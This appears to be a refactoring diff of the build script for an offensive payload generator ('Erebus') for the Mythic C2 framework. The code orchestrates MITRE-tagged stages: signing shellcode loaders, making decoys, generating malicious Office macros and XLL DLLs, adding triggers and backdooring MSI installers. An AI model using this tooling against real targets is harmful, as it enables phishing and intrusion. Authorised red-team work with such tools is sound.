-                        )
-
-                        if not file_resp.Success:
-                            raise ValueError("Failed to retrieve certificate file")
-
-                        cert_path = Path(agent_build_path) / "uploaded_cert.pfx"
-                        cert_path.write_bytes(file_resp.Content)
-
-                        sign_with_provided_cert(
-                            payload_path=payload_path,
-                            cert_path=cert_path,
-                            cert_password=cert_pass
-                        )
-                        success_msg = "Signed with provided certificate"
-
-                    elif signing_type == "Provide Certificate":
-                        raise NotImplementedError("Provide Certificate mode not yet implemented in backend")
-
-                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1553.006] - Sign Shellcode Loader",
-                        StepStdout=f"Success: {success_msg}",
-                        StepSuccess=True
-                    ))
-
-                except Exception as e:
-                    await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1553.006] - Sign Shellcode Loader",
-                        StepStdout=f"Signing Failed: {str(e)}",
-                        StepSuccess=False
-                    ))
-                    response.status = BuildStatus.Error
-                    response.build_stderr = f"Code signing failed: {str(e)}"
-                    return response
+            # R3b: dispatch into _apply_codesign() - see its docstring for
+            # the mode matrix. Method returns False on failure and has
+            # already populated response.status/build_stderr, so we just
+            # propagate the error response upward.
+            if not await self._apply_codesign(agent_build_path, dll_file_name, response):
+                return response
 
             ######################### Creating Decoy Section #########################
             if self.get_parameter("0.13 Decoy File Inclusion"):
@@ -3144,42 +3256,18 @@ generated if none have been entered.""",
                         custom_decoy_path = decoy_dir / custom_filename
                         custom_decoy_path.write_bytes(file_resp.Content)
 
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                                PayloadUUID=self.uuid,
-                                StepName="[T1036.008] - Creating Decoy",
-                                StepStdout=f"Replaced default decoys with custom file: {custom_filename}",
-                                StepSuccess=True
-                            ))
+                        await self._build_step("[T1036.008] - Creating Decoy", f"Replaced default decoys with custom file: {custom_filename}", success=True)
 
                     except Exception as e:
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                                PayloadUUID=self.uuid,
-                                StepName="[T1036.008] - Creating Decoy",
-                                StepStdout=f"Failed to process custom decoy: {str(e)}",
-                                StepSuccess=False
-                            ))
+                        await self._build_step("[T1036.008] - Creating Decoy", f"Failed to process custom decoy: {str(e)}", success=False)
                 else:
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1036.008] - Creating Decoy",
-                            StepStdout="Using default decoy files.",
-                            StepSuccess=True
-                        ))
+                    await self._build_step("[T1036.008] - Creating Decoy", "Using default decoy files.", success=True)
             ######################### End of Decoy Section #########################
             ######################### MalDoc Creation Section #########################
             maldoc_mode = self.get_parameter("0.9 Create MalDoc")
 
             if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") == "Trigger":
-                await SendMythicRPCPayloadUpdatebuildStep(
-                    MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1566.001] - Creating MalDoc",
-                        StepStdout="Skipping MalDoc Generation (Trigger selected as source).",
-                        StepSuccess=True
-                    ))
+                await self._build_step("[T1566.001] - Creating MalDoc", "Skipping MalDoc Generation (Trigger selected as source).", success=True)
 
             if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") != "Trigger":
                 payload_dir = Path(agent_build_path) / "payload"
@@ -3197,13 +3285,19 @@ generated if none have been entered.""",
                         trigger_binary = self.get_parameter("0.9f1 MalDoc Trigger Binary")
                         trigger_command = self.get_parameter("0.9f2 MalDoc Trigger Command")
 
-                        # Import the plugin function to generate command execution VBA
-                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
-                        plugin = PayloadMalDocsPlugin()
-                        vba_code = plugin.generate_command_execution_vba(
+                        # R3a: generate_command_execution_vba is registered by
+                        # plugin_payload_maldocs and auto-discovered into the
+                        # builder's globals by the R1c plugin-loader wiring.
+                        # Pre-R3a, this block open-coded an inline
+                        # `PayloadMalDocsPlugin()` instantiation because the
+                        # plugin's validate() used to hard-fail without
+                        # openpyxl, taking the VBA functions offline even on
+                        # openpyxl-less hosts. R3a relaxed validate() so the
+                        # plugin now loads in both cases.
+                        vba_code = generate_command_execution_vba(
                             trigger_binary=trigger_binary,
                             trigger_command=trigger_command,
-                            trigger_type=vba_trigger
+                            trigger_type=vba_trigger,
                         )
 
                     else:  # Shellcode Injection
@@ -3296,13 +3390,7 @@ generated if none have been entered.""",
                     # ==================== XLL (Excel Add-In DLL) Generation ====================
                     if xll_payload_type == "XLL Add-In DLL":
                         # Generate C/C++ source code for XLL DLL instead of VBA macro
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                                PayloadUUID=self.uuid,
-                                StepName="[T1559.002] - Generating XLL DLL",
-                                StepStdout="Generating C/C++ XLL source code...",
-                                StepSuccess=True
-                            ))
+                        await self._build_step("[T1559.002] - Generating XLL DLL", "Generating C/C++ XLL source code...", success=True)
 
                         # Get XLL-specific parameters
                         xll_injection_method = self.get_parameter("0.9i XLL Injection Method")
@@ -3484,13 +3572,7 @@ static size_t key_len = sizeof(key);
 
                         except Exception as e:
                             output += f"[-] XLL compilation error: {str(e)}\n"
-                            await SendMythicRPCPayloadUpdatebuildStep(
-                                MythicRPCPayloadUpdateBuildStepMessage(
-                                    PayloadUUID=self.uuid,
-                                    StepName="[T1559.002] - Generating XLL DLL",
-                                    StepStdout=f"XLL generation failed: {str(e)}",
-                                    StepSuccess=False
-                                ))
+                            await self._build_step("[T1559.002] - Generating XLL DLL", f"XLL generation failed: {str(e)}", success=False)
                             raise
 
                         # Skip VBA obfuscation if using XLL
@@ -3522,13 +3604,7 @@ static size_t key_len = sizeof(key);
 
                         output += success_msg + "\n"
 
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                                PayloadUUID=self.uuid,
-                                StepName="[T1566.001] - Creating MalDoc",
-                                StepStdout=success_msg,
-                                StepSuccess=True
-                            ))
+                        await self._build_step("[T1566.001] - Creating MalDoc", success_msg, success=True)
 
                     elif maldoc_type == "Create New":
                         maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
@@ -3658,22 +3734,10 @@ static size_t key_len = sizeof(key);
                         bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                         output += f"[*] build_maldoc.bat included for optional Windows-side COM re-injection\n"
 
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1566.001] - Creating MalDoc",
-                            StepStdout=success_msg,
-                            StepSuccess=True
-                        ))
+                    await self._build_step("[T1566.001] - Creating MalDoc", success_msg, success=True)
 
                 except Exception as e:
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1566.001] - Creating MalDoc",
-                            StepStdout=f"Failed to create/backdoor Excel document: {str(e)}",
-                            StepSuccess=False
-                        ))
+                    await self._build_step("[T1566.001] - Creating MalDoc", f"Failed to create/backdoor Excel document: {str(e)}", success=False)
                     response.status = BuildStatus.Error
                     response.build_stderr = f"MalDoc creation failed: {str(e)}"
                     return response
@@ -3682,13 +3746,7 @@ static size_t key_len = sizeof(key);
             ######################### Trigger Generation Section #########################
 
             if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") == "MalDoc":
-                await SendMythicRPCPayloadUpdatebuildStep(
-                    MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="[T1137.006] - Adding Trigger",
-                    StepStdout="Skipping Trigger Generation (MalDoc selected as source).",
-                    StepSuccess=True,
-                ))
+                await self._build_step("[T1137.006] - Adding Trigger", "Skipping Trigger Generation (MalDoc selected as source).", success=True)
 
             if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") != "MalDoc":
 
@@ -3801,23 +3859,11 @@ static size_t key_len = sizeof(key);
                         response.status = BuildStatus.Success
                         response.build_message = f"{trigger_type} Trigger created!"
 
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1137.006] - Adding Trigger",
-                            StepStdout=f"{trigger_type} Trigger created at: {trigger_path}",
-                            StepSuccess=True,
-                        ))
+                        await self._build_step("[T1137.006] - Adding Trigger", f"{trigger_type} Trigger created at: {trigger_path}", success=True)
                 except Exception as e:
                     response.status = BuildStatus.Error
                     response.build_message = f"Failed to create {trigger_type} trigger: {str(e)}"
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1137.006] - Adding Trigger",
-                        StepStdout=f"CRITICAL ERROR: Failed to create {trigger_type} trigger: {str(e)}",
-                        StepSuccess=False,
-                    ))
+                    await self._build_step("[T1137.006] - Adding Trigger", f"CRITICAL ERROR: Failed to create {trigger_type} trigger: {str(e)}", success=False)
                     return response
             ######################### End Of Trigger Generation Section #########################
             ######################### MSI Backdooring Section #########################
@@ -3831,13 +3877,7 @@ static size_t key_len = sizeof(key);
                         MythicRPCFileGetContentMessage(AgentFileId=msi_backdoor_uuid)
                     )
                     if not file_resp.Success or not file_resp.Content:
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1218.007] - Staging MSI",
-                            StepStdout="Failed to download uploaded MSI file from Mythic",
-                            StepSuccess=False,
-                        ))
+                        await self._build_step("[T1218.007] - Staging MSI", "Failed to download uploaded MSI file from Mythic", success=False)
                     else:
                         file_content = await getFileFromMythic(
                             agentFileId=msi_backdoor_uuid
@@ -3915,17 +3955,9 @@ static size_t key_len = sizeof(key);
                         bat_path = msi_payload_dir / "backdoor_msi.bat"
                         bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
 
-                        await SendMythicRPCPayloadUpdatebuildStep(
-                            MythicRPCPayloadUpdateBuildStepMessage(
-                            PayloadUUID=self.uuid,
-                            StepName="[T1218.007] - Staging MSI",
-                            StepStdout=(
-                                f"Staged: {original_msi_name}\n"
+                        await self._build_step("[T1218.007] - Staging MSI", f"Staged: {original_msi_name}\n"
                                 f"Run backdoor_msi.bat on Windows to produce {backdoored_name}\n"
-                                f"Attack: {msi_attack_type}  |  Action: {msi_custom_action}  |  Condition: {msi_condition}"
-                            ),
-                            StepSuccess=True,
-                        ))
+                                f"Attack: {msi_attack_type}  |  Action: {msi_custom_action}  |  Condition: {msi_condition}", success=True)
 
             ######################### End Of MSI Backdooring Section #########################
             ######################### Windows Helper Export #########################
@@ -3941,13 +3973,7 @@ static size_t key_len = sizeof(key);
                     self._bundle_helper_as_single_file(helper_src, helper_out)
                     output += "[+] Exported Erebus.Helper as erebus_helper.py\n"
 
-                    await SendMythicRPCPayloadUpdatebuildStep(
-                        MythicRPCPayloadUpdateBuildStepMessage(
-                        PayloadUUID=self.uuid,
-                        StepName="[T1036] - Exporting Helper",
-                        StepStdout="Exported Erebus.Helper as single-file erebus_helper.py",
-                        StepSuccess=True,
-                    ))
+                    await self._build_step("[T1036] - Exporting Helper", "Exported Erebus.Helper as single-file erebus_helper.py", success=True)
             except Exception as e:
                 output += f"[!] Warning: Failed to export helper: {str(e)}\n"
 
@@ -3965,13 +3991,7 @@ static size_t key_len = sizeof(key);
             self.generate_iocs_file(iocs_list, iocs_file_path)
             output += f"[+] Generated IOCs file: IOCs.txt ({len(iocs_list)} files tracked)\n"
 
-            await SendMythicRPCPayloadUpdatebuildStep(
-                MythicRPCPayloadUpdateBuildStepMessage(
-                PayloadUUID=self.uuid,
-                StepName="[T1005] - Gathering Files",
-                StepStdout=f"Generated IOCs tracking file with {len(iocs_list)} hashes",
-                StepSuccess=True,
-            ))
+            await self._build_step("[T1005] - Gathering Files", f"Generated IOCs tracking file with {len(iocs_list)} hashes", success=True)
 
             ######################### Final Payload / Container #########################
 
@@ -4001,7 +4021,7 @@ static size_t key_len = sizeof(key);
                         filename = "payload"
                         ext = "zip"
                     case "MSI":
-                        filename = "payload"
+                        filename = "ErebusInstaller"
                         ext = "msi"
                     case "ISO":
                         filename = "payload"
@@ -4017,13 +4037,7 @@ static size_t key_len = sizeof(key);
                 response.status = BuildStatus.Success
                 response.build_message = f"Success! Containerized ({container})"
 
-                await SendMythicRPCPayloadUpdatebuildStep(
-                    MythicRPCPayloadUpdateBuildStepMessage(
-                    PayloadUUID=self.uuid,
-                    StepName="[T1027] - Containerising",
-                    StepStdout=f"Payload packaged into {container} container",
-                    StepSuccess=True,
-                ))
+                await self._build_step("[T1027] - Containerising", f"Payload packaged into {container} container", success=True)
 
             return response
 
